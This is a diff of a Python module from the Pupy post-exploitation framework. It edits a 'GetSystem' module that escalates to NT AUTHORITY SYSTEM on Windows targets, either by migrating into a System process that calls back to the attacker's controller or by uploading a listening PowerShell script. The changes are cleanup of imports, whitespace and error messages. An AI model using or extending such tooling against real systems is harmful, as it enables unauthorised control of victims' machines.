@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
-from pupylib.PupyModule import *
+
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.utils.rpyc_utils import redirected_stdo
 from modules.lib.windows.migrate import migrate
 from rpyc.utils.classic import upload
+
+import os
 import pupygen
 import string
 import random
@@ -14,14 +17,14 @@ class GetSystem(PupyModule):
 
     """
     Try to get NT AUTHORITY SYSTEM privileges
-    
+
     - Case 1: If the launcher on the target uses a reverse connection (e.g. connect or auto_proxy), this module will migrate on a created System process by default.
     In this case, the created System launcher will connect to your pupy contoller automatically.
     - Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
-    In this case, a ps1 script will be uploaded and it will be executed as System on the target (without migration by default). 
+    In this case, a ps1 script will be uploaded and it will be executed as System on the target (without migration by default).
     This ps1 script listens on your given port on the target. You have to connect to this launcher manually.
     """
-    
+
     dependencies=["pupwinutils.security"]
 
     @classmethod
@@ -42,7 +45,7 @@ class GetSystem(PupyModule):
         #Contains ip:port used for bind connection on the target with ps1 script. None if reverse connection and (consequently) isBindLauncherForPs1==False
         listeningAddressPortForBindPs1 = None
         #Usefull information for bind mode connection (ps1 script)
-        launcherType, launcherArgs, addressPort = self.client.desc['launcher'], self.client.desc['launcher_args'], self.client.desc['address']
+        launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']
         #Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
         if launcherType == "bind":
             self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
@@ -82,7 +85,7 @@ class GetSystem(PupyModule):
                     try:
                         listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                     except Exception as e:
-                        self.warning("You have to give me a valid port. Try again")
+                        self.warning("You have to give me a valid port. Try again. ({})".format(e))
                 listeningAddress = addressPort.split(':')[0]
                 listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                 self.info("The ps1 script used for get a System pupy shell will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
